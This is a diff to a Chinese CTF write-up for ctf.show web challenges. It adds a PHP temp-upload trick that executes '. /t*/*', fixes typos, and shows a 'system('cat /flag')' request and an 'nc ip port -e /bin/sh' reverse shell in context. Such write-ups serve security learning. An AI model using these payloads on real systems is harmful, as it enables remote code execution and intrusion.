@@ -79,6 +79,26 @@ sh 0
 
 `http://f8e84766-7989-44db-8b32-a500d08a2ce0.challenge.ctf.show//api/1.php?1=system('cat /flag');`
 
+补一下官方 wp 的做法, 觉得挺有意思的
+
+原因在于 PHP 对文件上传的处理
+
+参考文章 [https://blog.csdn.net/qq_36078992/article/details/124301392](https://blog.csdn.net/qq_36078992/article/details/124301392)
+
+只要 POST 包中存在文件内容, PHP 都会把文件存储到缓存文件夹中 (默认是 /tmp), 在请求结束的时候文件会被删除
+
+但是这里我们可以尝试将命令执行和文件上传的操作弄进一个请求里面, 保证了在命令执行时缓存文件不会被删除
+
+命令执行的 payload, 刚好7个字符
+
+```
+. /t*/*
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208062007657.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208062007000.png)
+
 ## easy_calc
 
 ![20220805174541](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805174541.png)
@@ -96,7 +116,7 @@ eval('$result='."$code".";");
 echo($result);
 ```
 
-发现这里的 `$code` 其实是 `$num1$symbol$num2"`
+发现这里的 `$code` 其实是 `$num1$symbol$num2`
 
 也就是说 `$num2` 后面可能会有代码注入
 
@@ -150,7 +170,7 @@ flag 在 /secret 中
 
 最后 `nc ip port -e /bin/sh` 直接弹了个 shell 查看 flag
 
-写 wp 的时候发现 ifconfig 和 ping 那两部其实并不需要, 直接 nc 也能谈 shell, 不太理解给剩下三个命令是什么意思...
+写 wp 的时候发现 ifconfig 和 ping 那两步其实并不需要, 直接 nc 也能弹 shell, 不太理解给剩下三个命令是什么意思...
 
 # OSINT
 
